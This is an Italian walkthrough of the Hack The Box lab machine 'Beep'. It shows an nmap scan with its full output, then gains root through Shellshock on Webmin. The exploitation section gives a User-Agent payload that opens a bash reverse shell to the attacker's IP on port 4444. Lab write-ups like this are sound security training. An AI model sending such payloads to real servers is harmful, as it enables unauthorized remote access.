# Beep

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.75
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Le porte aperte sono le seguenti:

* **Porta 22**: OpenSSH 4.3
* **Porta 25**: Postfix smtpd
* **Porta 80**: Apache 2.2.3
* **Porta 110**: Cyrus pop3d 2.3.7
* **Porta 111**: rpcbind
* **Porta 143**: Cyrus imapd 2.3.7
* **Porta443**: Apache httpd 2.2.3 ((CentOS))
* **Porta993**: Cyrus imapd
* **Porta995**: Cyrus pop3d
* **Porta3306**: MySQL
* **Porta4445**: upnotifyp?
* **Porta10000**: MiniServ 1.570 (Webmin httpd)

```text
Nmap scan report for 10.10.10.7
Host is up (0.074s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: UIDL TOP USER LOGIN-DELAY(0) EXPIRE(NEVER) STLS PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE RESP-CODES APOP
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: X-NETSCAPE LISTEXT SORT=MODSEQ OK NO RIGHTS=kxte IMAP4 ATOMIC URLAUTHA0001 THREAD=ORDEREDSUBJECT RENAME UIDPLUS THREAD=REFERENCES CATENATE BINARY IDLE STARTTLS CONDSTORE MAILBOX-REFERRALS ACL NAMESPACE ANNOTATEMORE LIST-SUBSCRIBED ID Completed UNSELECT MULTIAPPEND CHILDREN SORT LITERAL+ IMAP4rev1 QUOTA
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2023-09-19T12:58:39+00:00; +1s from scanner time.
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Elastix - Login page
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/19%OT=22%CT=1%CU=32140%PV=Y%DS=2%DC=I%G=Y%TM=65099B6
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=B7%GCD=1%ISR=C7%TI=Z%CI=Z%TS=A)OPS(O1=M54
OS:DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6
OS:=M54DST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF
OS:=Y%T=40%W=16D0%O=M54DNNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M54DST11NW7%RD=0%Q=)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T6(R=N)T7(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%R
OS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com
```

## Enumeration

In questa fase cerco di capire se qualcuno di questi servizi è configurato in modo errato o se presenta vulnerabilità note.

### 1) Porta 10000 MiniServ 1.570

Come prima cosa visito la pagina https://10.10.10.7:100000:

<p align="center">
  <img src="/Immagini/Linux-Box/Beep/beep-1.png" />
</p>

Facendo una rapida ricerca capisco che potrebbe essere presente la vulnerabilità shellshock.

Quindi intercetto la richiesta di login tramite _burp_ trasferendola al Repeater.
Successivamente, modifico il campo User Agent nel seguente modo:

```text
() { :;}; bash -i >& /dev/tcp/10.10.14.12/4444 0>&1
```

Avvio un listener in ascolto sulla porta 4444 e invio la richiesta da burp.

<p align="center">
  <img src="/Immagini/Linux-Box/Beep/beep-2.png" />
</p>

**Da qui recupero sia user.txt che root.txt.**

## Considerazioni finali

Di sicuro ci saranno altri modi per bucare questa macchina, ma non mi va di scoprirli!

<p align="center">
  <img src="/Immagini/Linux-Box/Beep/beep-3.gif" />
</p>
